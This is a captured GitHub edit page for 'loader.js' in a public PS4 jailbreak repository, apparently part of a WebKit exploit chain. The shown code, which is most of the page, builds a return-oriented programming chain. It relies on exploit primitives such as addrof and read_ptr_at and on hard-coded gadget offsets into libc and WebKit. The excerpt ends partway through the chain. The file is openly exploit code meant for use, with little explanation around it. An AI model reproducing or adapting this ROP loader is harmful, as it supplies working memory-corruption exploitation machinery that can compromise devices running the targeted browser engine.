Skip to content
Search or jump to…
Pull requests
Issues
Marketplace
Explore
 
@octav90st 
DarkModderVC
/
PS4JB
Public
Code
Issues
21
Pull requests
2
Actions
Projects
Wiki
Security
Insights
You’re making changes in a project you don’t have write access to. Submitting a change will write it to a new branch in your fork octav90st/PS4JB-1, so you can send a pull request.
PS4JB
/
payloads
/
loader.js
in
DarkModderVC:master
 

Spaces

4

No wrap
1
function loader(){
2
var ropchain_array = new Uint32Array(55002);
3
var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
4
var ropchain_offset = 2;
5
function set_gadget(val)
6
{
7
    ropchain_array[ropchain_offset++] = val | 0;
8
    ropchain_array[ropchain_offset++] = (val / 4294967296) | 0;
9
}
10
function set_gadgets(l)
11
{
12
    for(var i = 0; i < l.length; i++)
13
        set_gadget(l[i]);
14
}
15
function db(data)
16
{
17
    for(var i = 0; i < data.length; i++)
18
        ropchain_array[ropchain_offset++] = data[i];
19
}
20
var main_ret = malloc(8);
21
var printf_buf = malloc(65536);
22
var __swbuf_addr = 0;
23
set_gadgets([
24
libc_base+788575,
25
ropchain+65720,
26
webkit_base+14461559,
27
libc_base+206806,
28
ropchain+65680,
29
libc_base+793877
30
]);
31
db([8, 0]);
32
set_gadgets([
33
libc_base+248252,
34
libc_base+788575,
35
ropchain+112,
36
libc_base+471355,
37
libc_base+811575,
38
ropchain+190576,
39
​
40
libc_base+811575,
41
ropchain+65680
42
]);
43
​
44
var printf_buf_offset = 128;
45
set_gadget(printf_buf);
@octav90st
Propose changes
Commit summary
Create loader.js
Optional extended description
Add an optional extended description…
 
© 2022 GitHub, Inc.
Terms
Privacy
Security
Status
Docs
Contact GitHub
Pricing
API
Training
Blog
About
